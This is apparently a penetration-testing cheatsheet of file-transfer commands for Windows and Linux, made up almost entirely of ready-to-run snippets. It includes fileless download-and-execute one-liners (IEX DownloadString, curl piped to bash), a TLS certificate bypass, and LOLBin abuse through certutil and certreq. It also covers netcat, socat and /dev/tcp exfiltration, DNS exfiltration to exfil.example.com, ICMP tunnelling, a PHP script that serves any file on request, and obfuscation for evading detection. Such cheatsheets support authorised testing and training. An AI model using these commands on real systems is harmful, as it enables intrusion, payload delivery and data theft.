# File Transfers - Cheatsheet

## File Transfers Cheatsheet

This document contains essential file transfer commands and techniques for both Windows and Linux systems.

### Windows File Transfers

#### PowerShell Downloads

```powershell
# Basic download
(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file.exe', 'C:\Windows\Temp\file.exe')

# Fileless execution
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')

# HTTPS with certificate bypass
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object Net.WebClient).DownloadFile('https://10.10.10.10/file.exe', 'C:\Windows\Temp\file.exe')

# Using Invoke-WebRequest
Invoke-WebRequest -Uri "http://10.10.10.10/file.exe" -OutFile "C:\Windows\Temp\file.exe" -UseBasicParsing
```

#### SMB Transfers

```cmd
# Copy from SMB share
copy \\10.10.10.10\share\file.exe C:\Windows\Temp\file.exe

# Mount and copy with credentials
net use Z: \\10.10.10.10\share /user:username password
copy Z:\file.exe C:\Windows\Temp\file.exe
```

#### Base64 Transfers

```powershell
# Encode file to Base64
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\Temp\file.exe" -Encoding Byte))

# Decode Base64 to file
[IO.File]::WriteAllBytes("C:\Windows\Temp\file.exe", [Convert]::FromBase64String("BASE64_STRING"))
```

#### BITS Transfers

```powershell
# Download using BITS
Start-BitsTransfer -Source "http://10.10.10.10/file.exe" -Destination "C:\Windows\Temp\file.exe"

# Using bitsadmin
bitsadmin /transfer myJob /download /priority high http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
```

#### FTP Transfers

```cmd
# Create FTP command file
echo open 10.10.10.10 21 > ftpcmd.txt
echo anonymous >> ftpcmd.txt
echo anonymous >> ftpcmd.txt
echo binary >> ftpcmd.txt
echo get file.exe >> ftpcmd.txt
echo quit >> ftpcmd.txt

# Use FTP with command file
ftp -s:ftpcmd.txt
```

#### PowerShell Uploads

```powershell
# Upload via POST request
$file = Get-Item "C:\Windows\Temp\file.exe"
Invoke-RestMethod -Uri "http://10.10.10.10/upload" -Method Post -Form @{ file=$file }

# Upload with WebClient
(New-Object Net.WebClient).UploadFile('http://10.10.10.10/upload', 'C:\Windows\Temp\file.exe')
```

#### LOLBins Transfers

```cmd
# Download with certutil
certutil -urlcache -split -f http://10.10.10.10/file.exe file.exe

# Upload with certreq
certreq -Post -config http://10.10.10.10/ C:\Windows\Temp\file.exe
```

### Linux File Transfers

#### Curl and Wget

```bash
# Download with curl
curl -o /tmp/file http://10.10.10.10/file

# Silent download with curl
curl -s -o /tmp/file http://10.10.10.10/file

# Download with wget
wget -O /tmp/file http://10.10.10.10/file

# Resume download with wget
wget -c -O /tmp/file http://10.10.10.10/file
```

#### Fileless Execution

```bash
# Execute without saving to disk
curl http://10.10.10.10/script.sh | bash

# Python script execution
wget -qO- http://10.10.10.10/script.py | python3
```

#### Bash /dev/tcp

```bash
# Download using bash networking
exec 3<>/dev/tcp/10.10.10.10/80
echo -e "GET /file HTTP/1.1\nHost: 10.10.10.10\n\n" >&3
cat <&3 > /tmp/file
```

#### Base64 Transfers

```bash
# Encode file to Base64
cat /tmp/file | base64 -w 0

# Decode Base64 to file
echo "BASE64_STRING" | base64 -d > /tmp/file
```

#### SCP Transfers

```bash
# Download with SCP
scp user@10.10.10.10:/path/to/file /tmp/file

# Upload with SCP
scp /tmp/file user@10.10.10.10:/path/to/destination

# Recursive directory transfer
scp -r /local/directory user@10.10.10.10:/remote/path
```

#### Netcat Transfers

```bash
# Receiving end
nc -lnvp 4444 > /tmp/file

# Sending end
cat /tmp/file | nc 10.10.10.10 4444

# Transfer directory using tar
tar -czvf - /path/to/dir | nc 10.10.10.10 4444
# Receiving end
nc -lnvp 4444 | tar -xzvf -
```

#### OpenSSL Transfers

```bash
# Create certificate (server-side)
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -out cert.pem

# Server (sending file)
openssl s_server -quiet -accept 4444 -cert cert.pem -key key.pem < /tmp/file

# Client (receiving file)
openssl s_client -quiet -connect 10.10.10.10:4444 > /tmp/file
```

#### Python Web Server

```bash
# Start HTTP server
python3 -m http.server 8000

# Start HTTP server on specific interface
python3 -m http.server 8000 --bind 10.10.10.10

# Python 2.7 HTTP server
python2 -m SimpleHTTPServer 8000
```

#### Upload Server

```bash
# Install uploadserver
pip3 install uploadserver

# Start basic upload server
python3 -m uploadserver 8000

# Start HTTPS upload server
python3 -m uploadserver 8000 --server-certificate cert.pem
```

#### File Upload with curl

```bash
# Upload single file
curl -F "file=@/path/to/file" http://10.10.10.10:8000/upload

# Upload multiple files
curl -F "file=@/path/to/file1" -F "file=@/path/to/file2" http://10.10.10.10:8000/upload

# Upload with custom filename
curl -F "file=@/path/to/file;filename=newname.txt" http://10.10.10.10:8000/upload
```

### PHP-based Transfers

#### PHP Web Server

```bash
# Start PHP web server
php -S 0.0.0.0:8000
```

#### PHP File Upload/Download Scripts

```php
<?php
// File download script - place on target server
if(isset($_GET['file'])) {
  $file = $_GET['file'];
  if(file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
  }
}
?>

<?php
// File upload script - place on receiving server
if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
    $tmp_name = $_FILES["file"]["tmp_name"];
    $name = $_FILES["file"]["name"];
    move_uploaded_file($tmp_name, "./$name");
    echo "File uploaded successfully";
}
?>
```

### SFTP Transfers

```bash
# Connect to SFTP server
sftp user@10.10.10.10

# SFTP commands
sftp> get /remote/file /local/path
sftp> put /local/file /remote/path
sftp> ls
sftp> cd /directory
sftp> mkdir /new/directory
sftp> bye
```

### Other Transfer Methods

#### Socat File Transfers

```bash
# Receiving end
socat -u TCP-LISTEN:4444,reuseaddr OPEN:/tmp/file,creat

# Sending end
socat -u OPEN:/path/to/file TCP:10.10.10.10:4444
```

#### Data Exfiltration via DNS

```bash
# Encode file for DNS exfiltration
xxd -p -c 16 /path/to/file | while read line; do host $line.exfil.example.com 10.10.10.10; done

# Server-side: Use tcpdump to capture queries
tcpdump -i eth0 -n "udp port 53"
```

#### ICMP Tunneling

```bash
# Install ptunnel
apt-get install ptunnel

# Server-side
ptunnel -x password

# Client-side
ptunnel -p 10.10.10.10 -lp 8000 -da 192.168.1.100 -dp 22 -x password
ssh -p 8000 localhost
```

### Obfuscation Techniques

#### Split Files for Transfer

```bash
# Split file into 1MB chunks
split -b 1m /path/to/large_file chunk_

# Reassemble file
cat chunk_* > large_file_restored
```

#### Encrypted Transfers

```bash
# Encrypt file before transfer
openssl enc -aes-256-cbc -salt -in /path/to/file -out /path/to/file.enc -k password

# Decrypt file after transfer
openssl enc -aes-256-cbc -d -in /path/to/file.enc -out /path/to/file -k password
```

#### Steganography

```bash
# Hide file inside image
steghide embed -cf cover.jpg -ef secret.txt -p password

# Extract hidden file
steghide extract -sf cover.jpg -p password
```

### Common Errors and Solutions

#### Connection Issues

```
ERROR: Failed to connect to 10.10.10.10 port 80: Connection refused
```

Solution: Verify the server is running and port is correct

#### Permission Errors

```
Permission denied
```

Solution: Check file permissions on source/destination

#### SSL/TLS Errors

```
SSL certificate problem: self-signed certificate
```

Solution: Add `-k` flag to curl or `--no-check-certificate` to wget

#### Transfer Speed Issues

```bash
# Limit bandwidth with curl
curl --limit-rate 100k -O http://10.10.10.10/large_file

# Limit bandwidth with wget
wget --limit-rate=100k http://10.10.10.10/large_file
```
